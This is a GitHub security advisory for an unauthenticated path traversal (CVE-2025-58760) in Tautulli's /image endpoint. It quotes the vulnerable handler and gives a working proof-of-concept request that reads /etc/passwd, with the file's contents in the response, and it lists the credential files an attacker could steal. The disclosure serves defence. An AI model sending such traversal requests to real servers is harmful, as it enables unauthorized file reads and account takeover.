Unauthenticated Path Traversal in `/image` endpoint · Advisory · Tautulli/Tautulli · GitHub
[Skip to content](#start-of-content)
{{ message }}
[
Tautulli
](/Tautulli)
/
**
[Tautulli](/Tautulli/Tautulli)
**
Public
*
* [ Notifications
](/login?return_to=/Tautulli/Tautulli) You must be signed in to change notification settings
* [ Fork
623
](/login?return_to=/Tautulli/Tautulli)
*
[
Star
6.5k
](/login?return_to=/Tautulli/Tautulli)
#
Unauthenticated Path Traversal in `/image` endpoint
High
[JonnyWong16](/JonnyWong16)
published
GHSA-8g4r-8f3f-hghp
Sep 9, 2025
## Package
No package listed
## Affected versions
\<=2.15.3
## Patched versions
2.16.0
## Description
### Summary
The `/image` API endpoint in Tautulli v2.15.3 is vulnerable to path traversal, allowing unauthenticated attackers to read arbitrary files from the application server's filesystem.
### Details
In Tautulli, the `/image` API endpoint is used to serve static images from the application’s data directory to users. This endpoint can be accessed without authentication, and its intended purpose is for server background images and icons within the user interface.
The endpoint maps URL path parameters onto positional arguments in `\*args`.
```
@cherrypy.expose
def image(self, \*args, \*\*kwargs):
if args:
cherrypy.response.headers['Cache-Control'] = 'max-age=3600' # 1 hour
if len(args) \>= 2 and args[0] == 'images':
resource\_dir = os.path.join(str(plexpy.PROG\_DIR), 'data/interfaces/default/')
try:
return serve\_file(path=os.path.join(resource\_dir, \*args), content\_type='image/png')
except NotFound:
return
img\_hash = args[0].split('.')[0]
if img\_hash in common.DEFAULT\_IMAGES:
fbi = common.DEFAULT\_IMAGES[img\_hash]
fp = os.path.join(plexpy.PROG\_DIR, 'data', fbi)
return serve\_file(path=fp, content\_type='image/png')
img\_info = notification\_handler.get\_hash\_image\_info(img\_hash=img\_hash)
if img\_info:
kwargs.update(img\_info)
return self.real\_pms\_image\_proxy(refresh=True, \*\*kwargs)
return
```
If there are more than two components to the path parameter and the first parameter is `images`, then Tautulli joins the user-supplied path parameter to the `"PROG\_DIR/data/interfaces/default/"` prefix in order to construct a file path. The contents of the resulting file are then served to the user directly. Since `\*args` is user-controlled and does not undergo sanitisation, this function is vulnerable to path traversal.
### PoC
Request:
```
`GET /image/images/../../../../../../../../../etc/passwd HTTP/1.1
Host: localhost:8181
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: application/json, text/javascript, \*/\*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Origin: http://localhost:8181
Connection: keep-alive
`
```
Response:
```
`HTTP/1.1 200 OK
Content-Type: image/png
Server: CherryPy/unknown
Date: Mon, 11 Aug 2025 06:40:04 GMT
Access-Control-Allow-Origin: http://localhost:8181
Vary: Origin, Accept-Encoding
Cache-Control: max-age=3600
Last-Modified: Sun, 03 Aug 2025 17:23:17 GMT
Accept-Ranges: bytes
Content-Length: 884
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
\_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
tautulli:x:1000:1000::/home/tautulli:/bin/sh
`
```
### Impact
Attackers can exfiltrate files from the application file system, including the `tautulli.db` SQLite database containing active JWT tokens, as well as the `config.ini` file which contains the hashed admin password, the JWT token secret, and the Plex Media Server token and connection details.
If the password is cracked, or if a valid JWT token is present in the database, an unauthenticated attacker can escalate their privileges to obtain administrative control over the application.
### Severity
High
8.6
#
CVSS overall score
This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).
/ 10
#### CVSS v3 base metrics
Attack vector
Network
Attack complexity
Low
Privileges required
None
User interaction
None
Scope
Changed
Confidentiality
High
Integrity
None
Availability
None
Learn more about base metrics
#
CVSS v3 base metrics
Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.
Attack complexity:
More severe for the least complex attacks.
Privileges required:
More severe if no privileges are required.
User interaction:
More severe when no user interaction is required.
Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.
Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.
Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.
Availability:
More severe when the loss of impacted component availability is highest.
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
### CVE ID
CVE-2025-58760
### Weaknesses
Weakness
CWE-23
####
[Relative Path Traversal](/advisories?query=cwe:23)
The product uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as .. that can resolve to a location that is outside of that directory.
[Learn more on MITRE.](https://cwe.mitre.org/data/definitions/23.html)
### Credits
* [](/d-xuan)[
d-xuan](/d-xuan)
Reporter